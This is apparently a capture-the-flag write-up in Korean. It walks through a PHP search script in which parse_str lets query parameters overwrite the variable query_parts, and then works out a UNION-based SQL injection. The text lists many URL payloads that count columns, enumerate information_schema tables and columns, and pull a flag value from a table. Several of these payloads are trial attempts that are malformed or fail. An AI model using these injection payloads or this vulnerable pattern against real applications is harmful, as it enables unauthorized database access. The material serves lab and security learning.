parse_str($_SERVER['QUERY_STRING']); 
getOperator($operator); 
$keyword = addslashes($keyword);
$where_clause = ''; 

if(!isset($search_cols)) { 
    $search_cols = 'subject|content'; 
} 

$cols = explode('|',$search_cols); 

foreach($cols as $col) { 
    $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : ''; 
    if($col) { 
        $query_parts = $col . " like '%" . $keyword . "%'"; 
    } 

    if($query_parts) { 
        $where_clause .= $query_parts; 
        $where_clause .= ' '; 
        $where_clause .= $operator; 
        $where_clause .= ' '; 
        $query_parts = ''; 
    } 
} 
소스의 핵심은 바로 이 자리라고 한다 
결국 이 소스 덕분에 query_parts를 바꾸면 
where_clause까지 변동시킬 수 있어서 유일하게 공격자가 원하는 값을 입력할 수 있는 
어택 벡터가 된다 (완전히 이해된 건 아니지만 일단 이 정도만 알아두고 넘어가자) 
-> 따라서 아래처럼 어택 백터를 구성하는 것이 가능해진다 
?search_cols=a&query_parts=1'%20UNION%202,3,4%20# (query_parts 임의 조작) 

?search_cols=a&query_parts=1 union select 1, 2, 3, 4 -- 
해당 쿼리문으로, 컬럼 값이 4개라는 것을 확인할 수 있었다. 
그렇다면? 테이블 이름과 컬럼 이름을 뽑아내자

?search_cols=a&query_parts=1 union select table_name from information_schema.tables-- 
(이 부분은 레퍼런스를 확인하면서 구성했다) 

?search_cols=a&query_parts=1 union select '1', '2', '3', table_name, '4' from information_schema.tables-- 

?search_cols=a&query_parts=1 union select 1, 2, 3, table_name-- 
 
?search_cols=test&query_parts=1 or 1 union select 1,table_name,3,4 from information_schema.tables

Th1s_1s_Flag_tbl ---> table_name으로 나온 거니까 그럼 이게 테이블명인건가??  ㅇㅇ 테이블명 맞다 

?search_cols=test&query_parts=1%20or%201%20union%20select%201,table_name,3,4%20from%20information_schema.tables

?search_cols=test&query_parts=1 or 1 union select 1,table_name,column_name,4 from information_schema.columns
UNION SELECT table_name, column_name, 1 FROM information_schema.columns
-> 테이블명, 칼럼명 다 확보됨   Th1s_1s_Flag_tbl, f1ag 

?search_cols=test&query_parts=1 or 1 union select 1,f1ag3,4 from Th1s_1s_Flag_tbl

?search_cols=test&query_parts=1 or 1 union select FLAG from INNODB_SYS_TABLES

?search_cols=test&query_parts=1 or 1 union select Th1s_1s_Flag_tbl from f1ag

?search_cols=test&query_parts=1 or 1 union select 1,2,3 from Th1s_1s_Flag_tbl

?search_cols=test&query_parts=1 or 1 union select ID from PROCESSLIST

?search_cols=a&operator=or&query_parts=1%20union%20select%201,f1ag,3,4%20from%20Th1s_1s_Flag_tbl%20
위에도 말했듯이 컬럼 값은 총 4이다 
1, 2, 3, 4 숫자를 넣어주는 이유는 flag위치를 선정해주기 위해서일 뿐이다 
실제로는 select f1ag from Th1s_1s_Flag_tbl 까지 생각했을 때 원하는 어택 벡터를 99.9%정도 완성한 것이라 볼 수 있다
